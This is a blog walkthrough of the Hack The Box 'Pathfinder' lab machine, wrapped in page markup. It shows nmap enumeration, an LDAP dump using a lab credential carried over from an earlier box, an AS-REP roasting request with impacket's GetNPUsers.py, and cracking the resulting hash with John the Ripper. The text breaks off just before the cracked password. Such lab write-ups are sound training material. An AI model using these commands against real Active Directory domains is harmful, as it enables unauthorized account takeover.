<!DOCTYPE html>
<html ‚ö°>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

    <title>Pathfinder Walkthrough</title>

    <link rel="icon" href="../../favicon.ico" type="image/x-icon" />
    <link rel="canonical" href="../index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    
    <meta property="og:site_name" content="h4rithd.com" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Pathfinder Walkthrough" />
    <meta property="og:description" content="After the Shield Walkthrough, Here I&#x27;m with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;very" />
    <meta property="og:url" content="https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/" />
    <meta property="og:image" content="https://h4rithd.com/blog/content/images/2021/05/5.jpg" />
    <meta property="article:published_time" content="2021-05-06T22:25:00.000Z" />
    <meta property="article:modified_time" content="2021-05-27T12:13:07.000Z" />
    <meta property="article:tag" content="h4rithd" />
    <meta property="article:tag" content="HackTheBox" />
    <meta property="article:tag" content="HarithDilshan" />
    <meta property="article:tag" content="HTB Walkthrough" />
    <meta property="article:tag" content="HTB Writeup" />
    <meta property="article:tag" content="StartingPoint" />
    <meta property="article:tag" content="Writeup" />
    <meta property="article:tag" content="Pathfinder Walkthrough" />
    <meta property="article:tag" content="Pathfinder" />
    
    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Pathfinder Walkthrough" />
    <meta name="twitter:description" content="After the Shield Walkthrough, Here I&#x27;m with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let&#x27;s hack and grab the flags. As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;very" />
    <meta name="twitter:url" content="https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/" />
    <meta name="twitter:image" content="https://h4rithd.com/blog/content/images/2021/05/5.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Harith Dilshan" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Pathfinder Walkthrough, Pathfinder" />
    <meta name="twitter:site" content="@h4rithd" />
    <meta property="og:image:width" content="1920" />
    <meta property="og:image:height" content="1182" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "h4rithd.com",
        "url": "https://h4rithd.com/blog/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://h4rithd.com/blog/content/images/2021/05/my.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Harith Dilshan",
        "image": {
            "@type": "ImageObject",
            "url": "https://h4rithd.com/blog/content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg",
            "width": 2000,
            "height": 2000
        },
        "url": "https://h4rithd.com/blog/author/harith/",
        "sameAs": []
    },
    "headline": "Pathfinder Walkthrough",
    "url": "https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/",
    "datePublished": "2021-05-06T22:25:00.000Z",
    "dateModified": "2021-05-27T12:13:07.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://h4rithd.com/blog/content/images/2021/05/5.jpg",
        "width": 1920,
        "height": 1182
    },
    "keywords": "h4rithd, HackTheBox, HarithDilshan, HTB Walkthrough, HTB Writeup, StartingPoint, Writeup, Pathfinder Walkthrough, Pathfinder",
    "description": "After the Shield Walkthrough, Here I&#x27;m with Pathfinder box and this is the last\nbox you can play if you are a free member on HTB platform. Let&#x27;s hack and grab\nthe flags.\n\n\n--------------------------------------------------------------------------------\n\nAs I mentioned before, the starting point machines are a series of 9 machines\nrated as &quot;very easy&quot; and should be rooted in a sequence. So it means, if you\nneed to go through this box, first of all you must have a complete Shield\n[https://h4rithd.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://h4rithd.com/blog/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.6" />
    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../../rss/index.html" />

    <style amp-custom>
    *,
    *::before,
    *::after {
        box-sizing: border-box;
    }

    html {
        overflow-x: hidden;
        overflow-y: scroll;
        font-size: 62.5%;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    body {
        min-height: 100vh;
        margin: 0;
        padding: 0;
        color: #3a4145;
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        font-size: 1.7rem;
        line-height: 1.55em;
        font-weight: 400;
        font-style: normal;
        background: #fff;
        scroll-behavior: smooth;
        overflow-x: hidden;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }

    p,
    ul,
    ol,
    li,
    dl,
    dd,
    hr,
    pre,
    form,
    table,
    video,
    figure,
    figcaption,
    blockquote {
        margin: 0;
        padding: 0;
    }

    ul[class],
    ol[class] {
        padding: 0;
        list-style: none;
    }

    img {
        display: block;
        max-width: 100%;
    }

    input,
    button,
    select,
    textarea {
        font: inherit;
        -webkit-appearance: none;
    }

    fieldset {
        margin: 0;
        padding: 0;
        border: 0;
    }

    label {
        display: block;
        font-size: 0.9em;
        font-weight: 700;
    }

    hr {
        position: relative;
        display: block;
        width: 100%;
        height: 1px;
        border: 0;
        border-top: 1px solid currentcolor;
        opacity: 0.1;
    }

    ::selection {
        text-shadow: none;
        background: #cbeafb;
    }

    mark {
        background-color: #fdffb6;
    }

    small {
        font-size: 80%;
    }

    sub,
    sup {
        position: relative;
        font-size: 75%;
        line-height: 0;
        vertical-align: baseline;
    }
    sup {
        top: -0.5em;
    }
    sub {
        bottom: -0.25em;
    }

    ul li + li {
        margin-top: 0.6em;
    }

    a {
        color: var(--ghost-accent-color, #1292EE);
        text-decoration-skip-ink: auto;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        margin: 0;
        font-weight: 700;
        color: #121212;
        line-height: 1.4em;
    }

    h1 {
        font-size: 3.4rem;
        line-height: 1.1em;
    }

    h2 {
        font-size: 2.4rem;
        line-height: 1.2em;
    }

    h3 {
        font-size: 1.8rem;
    }

    h4 {
        font-size: 1.7rem;
    }

    h5 {
        font-size: 1.6rem;
    }

    h6 {
        font-size: 1.6rem;
    }

    amp-img {
        height: 100%;
        width: 100%;
        max-width: 100%;
        max-height: 100%;
    }

    amp-img img {
        object-fit: cover;
    }

    .page-header {
        padding: 50px 5vmin 30px;
        text-align: center;
        font-size: 2rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .page-header a {
        color: #121212;
        font-weight: 700;
        text-decoration: none;
        font-size: 1.6rem;
        letter-spacing: -0.1px;
    }

    .post {
        max-width: 680px;
        margin: 0 auto;
    }

    .post-header {
        margin: 0 5vmin 5vmin;
        text-align: center;
    }

    .post-meta {
        margin: 1rem 0 0 0;
        text-transform: uppercase;
        color: #738a94;
        font-weight: 500;
        font-size: 1.3rem;
    }

    .post-image {
        margin: 0 0 5vmin;
    }

    .post-image img {
        display: block;
        width: 100%;
        height: auto;
    }

    .post-content {
        padding: 0 5vmin;
    }

    .post-content > * + * {
        margin-top: 1.5em;
    }

    .post-content [id]:not(:first-child) {
        margin: 2em 0 0;
    }

    .post-content > [id] + * {
        margin-top: 1rem;
    }

    .post-content [id] + .kg-card,
    .post-content blockquote + .kg-card {
        margin-top: 40px;
    }

    .post-content > ul,
    .post-content > ol,
    .post-content > dl {
        padding-left: 1.9em;
    }

    .post-content hr {
        margin-top: 40px;
    }

    .post .post-content hr + * {
        margin-top: 40px;
    }

    .post-content amp-img {
        background-color: #f8f8f8;
    }

    .post-content blockquote {
        position: relative;
        font-style: italic;
    }

    .post-content blockquote::before {
        content: "";
        position: absolute;
        left: -1.5em;
        top: 0;
        bottom: 0;
        width: 0.3rem;
        background: var(--ghost-accent-color, #1292EE);
    }

    .post-content :not(.kg-card):not([id]) + .kg-card {
        margin-top: 40px;
    }

    .post-content .kg-card + :not(.kg-card) {
        margin-top: 40px;
    }

    .kg-card figcaption {
        padding: 1.5rem 1.5rem 0;
        text-align: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.4em;
        opacity: 0.6;
    }

    .kg-card figcaption strong {
        color: rgba(0,0,0,0.8);
    }

    .post-content :not(pre) code {
        vertical-align: middle;
        padding: 0.15em 0.4em 0.15em;
        border: #e1eaef 1px solid;
        font-weight: 400;
        font-size: 0.9em;
        line-height: 1em;
        color: #15171a;
        background: #f0f6f9;
        border-radius: 0.25em;
    }

    .post-content > pre {
        overflow: scroll;
        padding: 16px 20px;
        color: #fff;
        background: #1F2428;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
    }

    .kg-embed-card {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
    }

    .kg-image-card img {
        margin: auto;
    }

    .kg-gallery-card + .kg-gallery-card {
        margin-top: 0.75em;
    }

    .kg-gallery-container {
        position: relative;
    }

    .kg-gallery-row {
        display: flex;
        flex-direction: row;
        justify-content: center;
    }

    .kg-gallery-image {
        width: 100%;
        height: 100%;
    }

    .kg-gallery-row:not(:first-of-type) {
        margin: 0.75em 0 0 0;
    }

    .kg-gallery-image:not(:first-of-type) {
        margin: 0 0 0 0.75em;
    }

    .kg-bookmark-card,
    .kg-bookmark-publisher {
        position: relative;
    }

    .kg-bookmark-container,
    .kg-bookmark-container:hover {
        display: flex;
        flex-wrap: wrap;
        flex-direction: row-reverse;
        color: currentColor;
        background: rgba(255,255,255,0.6);
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        text-decoration: none;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
        overflow: hidden;
    }

    .kg-bookmark-content {
        flex-basis: 0;
        flex-grow: 999;
        padding: 20px;
        order: 1;
    }

    .kg-bookmark-title {
        font-weight: 600;
        font-size: 1.5rem;
        line-height: 1.3em;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        max-height: 45px;
        margin: 0.5em 0 0 0;
        font-size: 1.4rem;
        line-height: 1.55em;
        overflow: hidden;
        opacity: 0.8;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
    }

    .kg-bookmark-metadata {
        margin-top: 20px;
    }

    .kg-bookmark-metadata {
        display: flex;
        align-items: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.3em;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
    }

    .kg-bookmark-metadata amp-img {
        width: 18px;
        height: 18px;
        max-width: 18px;
        max-height: 18px;
        margin-right: 10px;
    }

    .kg-bookmark-thumbnail {
        display: flex;
        flex-basis: 20rem;
        flex-grow: 1;
        justify-content: flex-end;
    }

    .kg-bookmark-thumbnail amp-img {
        max-height: 200px;
    }

    .kg-bookmark-author {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }

    .kg-bookmark-publisher::before {
        content: "‚Ä¢";
        margin: 0 .5em;
    }

    .kg-width-full.kg-card-hascaption {
        display: grid;
        grid-template-columns: inherit;
    }

    .post-content table {
        border-collapse: collapse;
        width: 100%;
    }

    .post-content th {
        padding: 0.5em 0.8em;
        text-align: left;
        font-size: .75em;
        text-transform: uppercase;
    }

    .post-content td {
        padding: 0.4em 0.7em;
    }

    .post-content tbody tr:nth-child(2n + 1) {
        background-color: rgba(0,0,0,0.1);
        padding: 1px;
    }

    .post-content tbody tr:nth-child(2n + 2) td:last-child {
        box-shadow:
            inset 1px 0 rgba(0,0,0,0.1),
            inset -1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:nth-child(2n + 2) td {
        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:last-child {
        border-bottom: 1px solid rgba(0,0,0,.1);
    }

    .page-footer {
        padding: 60px 5vmin;
        margin: 60px auto 0;
        text-align: center;
        background-color: #f8f8f8;
    }

    .page-footer h3 {
        margin: 0.5rem 0 0 0;
    }

    .page-footer p {
        max-width: 500px;
        margin: 1rem auto 1.5rem;
        font-size: 1.7rem;
        line-height: 1.5em;
        color: rgba(0,0,0,0.6)
    }

    .powered {
        display: inline-flex;
        align-items: center;
        margin: 30px 0 0;
        padding: 6px 9px 6px 6px;
        border: rgba(0,0,0,0.1) 1px solid;
        font-size: 12px;
        line-height: 12px;
        letter-spacing: -0.2px;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        font-weight: 500;
        color: #222;
        text-decoration: none;
        background: #fff;
        border-radius: 6px;
    }

    .powered svg {
        height: 16px;
        width: 16px;
        margin: 0 6px 0 0;
    }

    @media (max-width: 600px) {
        body {
            font-size: 1.6rem;
        }
        h1 {
            font-size: 3rem;
        }

        h2 {
            font-size: 2.2rem;
        }
    }

    @media (max-width: 400px) {
        h1 {
            font-size: 2.6rem;
            line-height: 1.15em;
        }
        h2 {
            font-size: 2rem;
            line-height: 1.2em;
        }
        h3 {
            font-size: 1.7rem;
        }
    }

    :root {--ghost-accent-color: #006ac7;}
    </style>

    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <script async src="https://cdn.ampproject.org/v0.js"></script>

    

</head>

<body class="amp-template">
    <header class="page-header">
        <a href="../../index.html">
                <amp-img class="site-icon" src="https://h4rithd.com/blog/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
        </a>
    </header>

    <main class="content" role="main">
        <article class="post">

            <header class="post-header">
                <h1 class="post-title">Pathfinder Walkthrough</h1>
                <section class="post-meta">
                    Harith Dilshan -
                    <time class="post-date" datetime="2021-05-07">07 May 2021</time>
                </section>
            </header>
            <figure class="post-image">
                <amp-img src="https://h4rithd.com/blog/content/images/2021/05/5.jpg" width="600" height="340" layout="responsive"></amp-img>
            </figure>
            <section class="post-content">

                <p>After the Shield Walkthrough, Here I'm with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let's hack and grab the flags.</p><hr></hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as "<strong>very easy</strong>" and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/index.html">Shield </a>machine.</p><p>Enough talks, ü•± Let‚Äôs Get It Started üê±‚Äçüíª</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! üê±‚Äçüë§</blockquote><hr></hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine ‚Ä¶</h2><p>To start machine, just click "<strong>Join Machine</strong>".</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVeG5FnToZfGM0SkP%2Fimage.png?alt=media&amp;token=80527a75-c0ba-4fad-b31f-caed1e2e416c" class="kg-image" alt width="1642" height="713" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Pathfinder </div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.30 </strong></code><strong>ü§†</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVp2aY2oIGboXm46j%2Fimage.png?alt=media&amp;token=653c86c8-adfe-4e17-8adf-9f6309e6d777" class="kg-image" alt width="423" height="506" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>10.10.10.30</div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might "Disable" ping requests from passing through the firewall. But in most cases ping will be a success! üôÇ</p><pre><code class="language-bash">‚îå‚îÄ‚îÄ(rootüíÄHidd3nWiki)-[~/Documents/Pathfinder]
‚îî‚îÄ# ping 10.10.10.30 -c 2
PING 10.10.10.30 (10.10.10.30) 56(84) bytes of data.
64 bytes from 10.10.10.30: icmp_seq=1 ttl=127 time=235 ms
64 bytes from 10.10.10.30: icmp_seq=2 ttl=127 time=237 ms

--- 10.10.10.30 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 235.305/236.156/237.007/0.851 ms</code></pre><p>As a ping result, It's <code>TTL=127</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Windows</code> machine.</p><hr></hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First ‚Ä¶</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.30</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output üëá</p><pre><code class="language-bash">‚îî‚îÄ# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.30
Discovered open port 389/tcp on 10.10.10.30
Discovered open port 49676/tcp on 10.10.10.30
SYN Stealth Scan Timing: About 72.99% done; ETC: 11:27 (0:00:56 remaining)
Discovered open port 49714/tcp on 10.10.10.30
Discovered open port 49664/tcp on 10.10.10.30
Discovered open port 49667/tcp on 10.10.10.30
Discovered open port 636/tcp on 10.10.10.30
Discovered open port 88/tcp on 10.10.10.30
Discovered open port 9389/tcp on 10.10.10.30
Discovered open port 49666/tcp on 10.10.10.30
Discovered open port 3268/tcp on 10.10.10.30
Completed SYN Stealth Scan at 11:26, 173.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.30
Host is up, received echo-reply ttl 127 (0.24s latency).
Scanned at 2021-05-21 11:23:43 EDT for 175s
Not shown: 65466 closed ports, 45 filtered ports
Reason: 65466 resets and 45 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49714/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 174.50 seconds
           Raw packets sent: 85085 (3.744MB) | Rcvd: 80313 (3.213MB)
          </code></pre><p>This is why I recommend to scan all the ports. Here you can see there are so many ports open and by looking at the open ports (<code>ldap,kpasswd5 &amp; kerberos</code>) we can definitely say that this machine is an<strong> Active Directory </strong>machine. We haven't touched that area before. Sharp your Active Directory enumeration skills, it will worth if you are willing to try Red Team activities.</p><blockquote>Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. [Copied from ¬†<a href="https://en.wikipedia.org/wiki/Active_Directory" rel="noopener noreferrer">Wikipedia</a>]</blockquote><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">‚îå‚îÄ‚îÄ(rootüíÄHidd3nWiki)-[~/Documents/Pathfinder]
‚îî‚îÄ# nmap -sV -sC -oN DetailPorts.nmap -p 49667,49720,49676,49677,593,139,3269,389,9389,135,3268,49664,464,47001,636,49700,49665,49666,49672,5985,445,53,49683,88 10.10.10.30
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 11:43 EDT
Nmap scan report for 10.10.10.30
Host is up (0.23s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-21 22:54:30Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49672/tcp closed unknown
49676/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc         Microsoft Windows RPC
49683/tcp open   msrpc         Microsoft Windows RPC
49700/tcp closed unknown
49720/tcp closed unknown
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h11m13s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-05-21T22:55:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.98 seconds</code></pre><p>As it is an Active Directory machine, our enumeration steps will be different. l<strong>dap enumeration</strong> is pretty cool if you use <a href="https://github.com/BloodHoundAD/BloodHound" rel="noopener noreferrer">BloodHound</a> ¬†because it gives us graphical information. But it's already done in official writeup. So let's begin with my way. üòéüòé</p><h3 id="013-discover-more-on-domain">01.3 Discover more on domain</h3><p>Nmap tells us the domain (<code>Domain: MEGACORP</code>) we are in. And don't forget we had some credentials from <a href="https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/index.html">Shield </a>machine. <code>sandra:Password1234!</code> First we can tryout with <a href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener noreferrer"><code>ldapdomaindump</code></a> tool. Let's start.</p><pre><code class="language-bash">ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30 --no-json --no-grep  </code></pre><pre><code class="language-bash">-u    : DOMAIN\username for authentication, leave empty for anonymous authentication
-p    : Password or LM:NTLM hash, will prompt if not specified
-o    : Directory in which the dump will be saved (default: current)
--no-json    : Disable JSON output
--no-grep    : Disable Greppable output </code></pre><p>Here is the output, üëáüëá</p><pre><code class="language-bash">‚îå‚îÄ‚îÄ(rootüíÄHidd3nWiki)-[~/Documents/Pathfinder]
‚îî‚îÄ# ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

‚îå‚îÄ‚îÄ(rootüíÄHidd3nWiki)-[~/Documents/Pathfinder]
‚îî‚îÄ# cd ldapinfo

‚îå‚îÄ‚îÄ(rootüíÄHidd3nWiki)-[~/Documents/Pathfinder/ldapinfo]
‚îî‚îÄ# ls
domain_users.html  domain_computers_by_os.html  domain_computers.html  domain_groups.html  domain_policy.html  domain_trusts.html  domain_users_by_group.html  </code></pre><p>As you can see there are a lot of <code>HTML</code> files here. Among them, first I choose <code>domain_users.html</code> You can view through it from the browser. But instead of that, I will use <a href="https://pypi.org/project/html2text/" rel="noopener noreferrer"><code>html2text</code> </a>tool. You can simply install it by typing <code>sudo apt-get install html2text</code> . However the result will be like this. üëáüëá</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-58.png" class="kg-image" alt width="1166" height="514" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-58.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/05/image-58.png 1000w, https://h4rithd.com/blog/content/images/2021/05/image-58.png 1166w" layout="responsive"></amp-img></figure><p>There are 5 accounts here. <code>Guest, Administrator</code> and <code>krbtgt </code>accounts are the default accounts. <code>sandra </code>and <code>svc_bes </code>accounts are user created ones. As you can see, I highlighted the <code>svc_bes </code>account because it has enabled the<strong><code>DONT_REQ_PREAUTH</code></strong> flag.</p><p>Now I'll simply explain what the kerberos authentication is. If you need to know what <code>DONT_REQ_PREAUTH</code> flag means, you must understand the<strong> kerberos authentication </strong>before.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaF3QozWJmcpKh919-T%2F-MaF5pftRxID2hv08kO6%2Fimage.png?alt=media&amp;token=c0162370-9528-4d00-9132-23921274ab6c" class="kg-image" alt width="515" height="340" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><div><div>Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>This draft shows you how the normal authentication process. But if <code>DONT_REQ_PREAUTH</code> flag is set, <strong>second </strong>and <strong>third </strong>steps of the process can be missed. That means you can directly request the service ticket. Click <a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)" rel="noopener noreferrer">here</a> if you need more information about kerberos authentication.</p><hr></hr><h2 id="02-foothold">02. Foothold</h2><p>Now we are going to use <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket's</a> <code>GetNPUsers.py</code> script to grab the request service ticket.</p><p>Type below commands to grab the request ticket.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john</code></pre><pre><code>-request   : Requests TGT for users and output them in JtR/hashcat format (default False)
-no-pass   : Don't ask for password (useful for Kerberos authentication)
-dc-ip     : IP Address of the domain controller.
-format    : Format to save the AS_REQ of users without pre-authentication. Default is hashcat</code></pre><p>Output will be like this. üëáüëá</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-59.png" class="kg-image" alt width="1348" height="171" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-59.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/05/image-59.png 1000w, https://h4rithd.com/blog/content/images/2021/05/image-59.png 1348w" layout="responsive"></amp-img></figure><p>We grabbed the ticket. Now it's time to powerup <a href="https://www.openwall.com/john/" rel="noopener noreferrer">John the Ripper</a> and crack the hash. First of all copy that hash to file then run the <code>john</code>.ü§†ü§†</p><pre><code class="language-bash">john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/05/image-60.png" class="kg-image" alt width="1344" height="320" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/05/image-60.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/05/image-60.png 1000w, https://h4rithd.com/blog/content/images/2021/05/image-60.png 1344w" layout="responsive"></amp-img></figure><p>We got the password for <code>svc_bes</code> !!!</p><ul><li>svc_bes : 